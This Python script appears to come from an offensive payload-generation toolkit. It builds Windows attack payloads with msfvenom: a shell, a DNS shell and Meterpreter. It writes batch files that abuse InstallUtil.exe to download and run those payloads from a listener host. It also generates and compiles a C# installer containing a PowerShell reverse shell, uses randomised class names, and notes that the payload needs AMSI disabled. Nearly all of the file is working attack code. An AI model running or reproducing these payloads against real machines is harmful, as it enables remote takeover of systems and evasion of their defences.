#! /usr/bin/env python3
import os
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()


##  Installme
def gen_400():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the  InstallUtil  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 400 32bit Base64 payload -------")

  os.system("msfvenom -p " + m.SHELL32_Payload + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + m.SHELL32_PORT + " --platform win -a x86 EXITFUNC=thread -f raw  | base64 >" + m.targetfile + "400-SHELL32.b64")


  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit InstallUtil SHELL BAT file...")
  SHELLINST_bat_file = open(m.targetfile + "402-InstallUtil-Shell.bat", "w")
  SHELLINST_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /u /f=http://"+m.listener_ip+r"/400-SHELL32.b64 402-installme_x86.dll")
  SHELLINST_bat_file.close()

  os.system("msfvenom -p " + m.SHELLDNSWIN + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + m.DNSPORT + " --platform win -a x86 EXITFUNC=thread -f raw  | base64 >" + m.targetfile + "401-DNS-SHELL32.b64")

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit InstallUtil DNS SHELL BAT file...")
  SHELINST_bat_file = open(m.targetfile + "401-InstallUtil-DNS.bat", "w")
  SHELINST_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /u /f=http://"+m.listener_ip+r"/401-DNS-SHELL32.b64 402-installme_x86.dll")
  SHELINST_bat_file.close()

  print("\tMoving files!!")
  os.system("cp ./src/installme_x86.dll " + m.targetfile + "402-installme_x86.dll")


  namespace = m.randomString(9)
  classname = m.randomString(9)
  pclassname = m.randomString(9)
  statename = m.randomString(8)
  runspacename = m.randomString(8)
  SMA_DLL = "'./src/System.Management.Automation.dll'"

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating  InstallUtil PowerShell CSharp file...")

  pscsinst = "using System;\n"
  pscsinst += "using System.Management.Automation;\n"
  pscsinst += "namespace {0}\n".format(namespace)
  pscsinst += "{\n"
  pscsinst += "\tclass {0}\n".format(classname)
  pscsinst += "\t{\n"
  pscsinst += "\t\tstatic void Main(string[] args)\n"
  pscsinst += "\t\t{\n"
  pscsinst += "\t\t}\n"
  pscsinst += "\t}\n"
  pscsinst += "}\n"
  pscsinst += "[System.ComponentModel.RunInstaller(true)]\n"
  pscsinst += "\tpublic class {0} : System.Configuration.Install.Installer\n".format(pclassname)
  pscsinst += "\t{\n"
  pscsinst += "\t\tpublic override void Uninstall(System.Collections.IDictionary {0})\n".format(statename)
  pscsinst += "\t\t{\n"
  pscsinst += "\t\t\tPowerShell {0} = PowerShell.Create();\n".format(runspacename)
  pscsinst += '\t\t\t\t{0}.AddCommand("Invoke-Expression");\n'.format(runspacename)
  pscsinst += "\t\t\t\t{0}.AddArgument(\"$client = New-Object System.Net.Sockets.TCPClient".format(runspacename) +  "(\'" + m.listener_ip + "\'," + m.SHELL32_PORT + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\");\n"
  pscsinst += "\t\t\t\t{0}.Invoke();\n".format(runspacename)
  pscsinst += "\t\t}\n\n"
  pscsinst += "\t}"

  psinst_cs_file = open(m.targetfile + "403-PS-installutil.cs", "w")
  psinst_cs_file.write(pscsinst)
  psinst_cs_file.close()

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating  InstallUtil PowerShell exe file...")
  os.system("mcs -platform:x86 -target:winexe -r:System.Configuration.Install,System.Windows.Forms," + SMA_DLL + " " + m.targetfile + "403-PS-installutil.cs -out:" + m.targetfile + "403-PS-installutil.exe")

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit InstallUtil PowerShell BAT file...")
  psinst_bat_file = open(m.targetfile + "404-InstallUtil-PS.bat", "w")
  psinst_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /logfile= /logtoconsole=false 403-PS-installutil.exe")
  psinst_bat_file.close()
  print(m.bcolors.ERROR + m.bcolors.BOLD + "***THE InstallUtil PowerShell Payload will only work if AMSI is disabled***" + m.bcolors.ENDC)
def gen_401():

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 405 32bit MET Base64 payload -------")
  os.system("msfvenom -p " + m.METRT32_Payload + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + m.METRT32_PORT + " --platform win -a x86 EXITFUNC=thread -f raw  | base64 >" + m.targetfile + "405-MET32.b64")


  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit InstallUtil MET BAT file...")
  SHELLINST_bat_file = open(m.targetfile + "406-InstallUtil-MET.bat", "w")
  SHELLINST_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /u /f=http://"+m.listener_ip+r"/405-MET32.b64 402-installme_x86.dll")
  SHELLINST_bat_file.close()

